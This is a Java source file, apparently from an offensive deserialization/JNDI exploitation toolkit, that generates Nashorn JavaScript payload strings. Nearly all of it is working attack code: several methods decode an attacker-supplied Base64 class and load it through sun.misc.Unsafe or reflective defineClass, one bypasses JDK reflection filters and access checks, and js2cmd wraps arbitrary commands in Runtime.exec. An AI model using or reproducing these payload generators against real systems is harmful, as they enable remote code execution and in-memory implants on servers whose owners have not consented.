package com.h2tg.ysogate.bullet.defineClass;

import org.apache.commons.lang.StringEscapeUtils;

import java.util.Base64;

//适用范围：jdk6-14
public class JsConverter
{
    public static String all(String baseCode)
    {
        String js = "function Base64DecodeToByte(str) {\n" +
                "    var bt;\n" +
                "    try {\n" +
                "        bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
                "    } catch (e) {\n" +
                "        bt = java.util.Base64.getDecoder().decode(str);\n" +
                "    }\n" +
                "    return bt;\n" +
                "}\n" +
                "\n" +
                "function defineClass(classBytes) {\n" +
                "    var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
                "    theUnsafe.setAccessible(true);\n" +
                "    unsafe = theUnsafe.get(null);\n" +
                "    unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), classBytes, null).newInstance();\n" +
                "}\n" +
                "\n" +
                "defineClass(Base64DecodeToByte(\"" + baseCode + "\"));";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String defineAnonymous(String baseCode)
    {
        String js = "function Base64DecodeToByte(str) {\n" +
                "    var bt;\n" +
                "    try {\n" +
                "        bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
                "    } catch (e) {\n" +
                "        bt = java.util.Base64.getDecoder().decode(str);\n" +
                "    }\n" +
                "    return bt;\n" +
                "}\n" +
                "\n" +
                "function defineClass(classBytes) {\n" +
                "    var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
                "    theUnsafe.setAccessible(true);\n" +
                "    unsafe = theUnsafe.get(null);\n" +
                "    unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), classBytes, null).newInstance();\n" +
                "}\n" +
                "\n" +
                "defineClass(Base64DecodeToByte(\"" + baseCode + "\"));";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String goby(String baseCode)
    {
        String js = "try {\n" +
                "    load(\"nashorn:mozilla_compat.js\");\n" +
                "} catch (e) {\n" +
                "}\n" +
                "\n" +
                "function getUnsafe() {\n" +
                "    var theUnsafeMethod =\n" +
                "        java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\");\n" +
                "    theUnsafeMethod.setAccessible(true);\n" +
                "    return theUnsafeMethod.get(null);\n" +
                "}\n" +
                "\n" +
                "function removeClassCache(clazz) {\n" +
                "    var unsafe = getUnsafe();\n" +
                "    var clazzAnonymousClass = unsafe.defineAnonymousClass(\n" +
                "        clazz,\n" +
                "        java.lang.Class.forName(\"java.lang.Class\")\n" +
                "            .getResourceAsStream(\"Class.class\")\n" +
                "            .readAllBytes(),\n" +
                "        null\n" +
                "    );\n" +
                "    var reflectionDataField =\n" +
                "        clazzAnonymousClass.getDeclaredField(\"reflectionData\");\n" +
                "    unsafe.putObject(clazz, unsafe.objectFieldOffset(reflectionDataField), null);\n" +
                "}\n" +
                "\n" +
                "function bypassReflectionFilter() {\n" +
                "    var reflectionClass;\n" +
                "    try {\n" +
                "        reflectionClass = java.lang.Class.forName(\n" +
                "            \"jdk.internal.reflect.Reflection\"\n" +
                "        );\n" +
                "    } catch (error) {\n" +
                "        reflectionClass = java.lang.Class.forName(\"sun.reflect.Reflection\");\n" +
                "    }\n" +
                "    var unsafe = getUnsafe();\n" +
                "    var classBuffer = reflectionClass\n" +
                "        .getResourceAsStream(\"Reflection.class\")\n" +
                "        .readAllBytes();\n" +
                "    var reflectionAnonymousClass = unsafe.defineAnonymousClass(\n" +
                "        reflectionClass,\n" +
                "        classBuffer,\n" +
                "        null\n" +
                "    );\n" +
                "    var fieldFilterMapField =\n" +
                "        reflectionAnonymousClass.getDeclaredField(\"fieldFilterMap\");\n" +
                "    var methodFilterMapField =\n" +
                "        reflectionAnonymousClass.getDeclaredField(\"methodFilterMap\");\n" +
                "    if (\n" +
                "        fieldFilterMapField\n" +
                "            .getType()\n" +
                "            .isAssignableFrom(java.lang.Class.forName(\"java.util.HashMap\"))\n" +
                "    ) {\n" +
                "        unsafe.putObject(\n" +
                "            reflectionClass,\n" +
                "            unsafe.staticFieldOffset(fieldFilterMapField),\n" +
                "            java.lang.Class.forName(\"java.util.HashMap\")\n" +
                "                .getConstructor()\n" +
                "                .newInstance()\n" +
                "        );\n" +
                "    }\n" +
                "    if (\n" +
                "        methodFilterMapField\n" +
                "            .getType()\n" +
                "            .isAssignableFrom(java.lang.Class.forName(\"java.util.HashMap\"))\n" +
                "    ) {\n" +
                "        unsafe.putObject(\n" +
                "            reflectionClass,\n" +
                "            unsafe.staticFieldOffset(methodFilterMapField),\n" +
                "            java.lang.Class.forName(\"java.util.HashMap\")\n" +
                "                .getConstructor()\n" +
                "                .newInstance()\n" +
                "        );\n" +
                "    }\n" +
                "    removeClassCache(java.lang.Class.forName(\"java.lang.Class\"));\n" +
                "}\n" +
                "\n" +
                "function setAccessible(accessibleObject) {\n" +
                "    var unsafe = getUnsafe();\n" +
                "    var overrideField = java.lang.Class.forName(\n" +
                "        \"java.lang.reflect.AccessibleObject\"\n" +
                "    ).getDeclaredField(\"override\");\n" +
                "    var offset = unsafe.objectFieldOffset(overrideField);\n" +
                "    unsafe.putBoolean(accessibleObject, offset, true);\n" +
                "}\n" +
                "\n" +
                "function defineClass(bytes) {\n" +
                "    var clz = null;\n" +
                "    var version = java.lang.System.getProperty(\"java.version\");\n" +
                "    var unsafe = getUnsafe();\n" +
                "    var classLoader = new java.net.URLClassLoader(\n" +
                "        java.lang.reflect.Array.newInstance(\n" +
                "            java.lang.Class.forName(\"java.net.URL\"),\n" +
                "            0\n" +
                "        )\n" +
                "    );\n" +
                "    try {\n" +
                "        if (version.split(\".\")[0] >= 11) {\n" +
                "            bypassReflectionFilter();\n" +
                "            defineClassMethod = java.lang.Class.forName(\n" +
                "                \"java.lang.ClassLoader\"\n" +
                "            ).getDeclaredMethod(\n" +
                "                \"defineClass\",\n" +
                "                java.lang.Class.forName(\"[B\"),\n" +
                "                java.lang.Integer.TYPE,\n" +
                "                java.lang.Integer.TYPE\n" +
                "            );\n" +
                "            setAccessible(defineClassMethod);\n" +
                "            clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);\n" +
                "        } else {\n" +
                "            var protectionDomain = new java.security.ProtectionDomain(\n" +
                "                new java.security.CodeSource(\n" +
                "                    null,\n" +
                "                    java.lang.reflect.Array.newInstance(\n" +
                "                        java.lang.Class.forName(\"java.security.cert.Certificate\"),\n" +
                "                        0\n" +
                "                    )\n" +
                "                ),\n" +
                "                null,\n" +
                "                classLoader,\n" +
                "                []\n" +
                "            );\n" +
                "            clz = unsafe.defineClass(\n" +
                "                null,\n" +
                "                bytes,\n" +
                "                0,\n" +
                "                bytes.length,\n" +
                "                classLoader,\n" +
                "                protectionDomain\n" +
                "            );\n" +
                "        }\n" +
                "    } catch (error) {\n" +
                "        error.printStackTrace();\n" +
                "    } finally {\n" +
                "        return clz;\n" +
                "    }\n" +
                "}\n" +
                "\n" +
                "function base64DecodeToByte(str) {\n" +
                "    var bt;\n" +
                "    try {\n" +
                "        bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str);\n" +
                "    } catch (e) {\n" +
                "        bt = java.lang.Class.forName(\"java.util.Base64\").newInstance().getDecoder().decode(str);\n" +
                "    }\n" +
                "    return bt;\n" +
                "}\n" +
                "clz = defineClass(base64DecodeToByte(\"" + baseCode + "\"));\n" +
                "clz.newInstance();";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String loadByJS(String baseCode)
    {
        String js = "var bytes = java.util.Base64.getDecoder().decode('" + baseCode + "');" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);" +
                "method.setAccessible(true);" +
                "var clazz = method.invoke(classLoader, bytes, 0, bytes.length);" +
                "clazz.newInstance();";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String loadByJS2(String baseCode)
    {
        String js = "var s = '" + baseCode + "';" +
                "var bt;" +
                "try {" +
                "bt = java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(s);" +
                "} catch (e) {" +
                "bt = java.util.Base64.getDecoder().decode(s);" +
                "}" +
                "var theUnsafeField = java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');" +
                "theUnsafeField.setAccessible(true);" +
                "unsafe = theUnsafeField.get(null);" +
                "unsafe.defineAnonymousClass(java.lang.Class.forName('java.lang.Class'), bt, null).newInstance();";
        return StringEscapeUtils.escapeJava(js);
    }

    public static String js2cmd(String cmd)
    {
        String js = "java.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
        return StringEscapeUtils.escapeJava(js);
    }
}
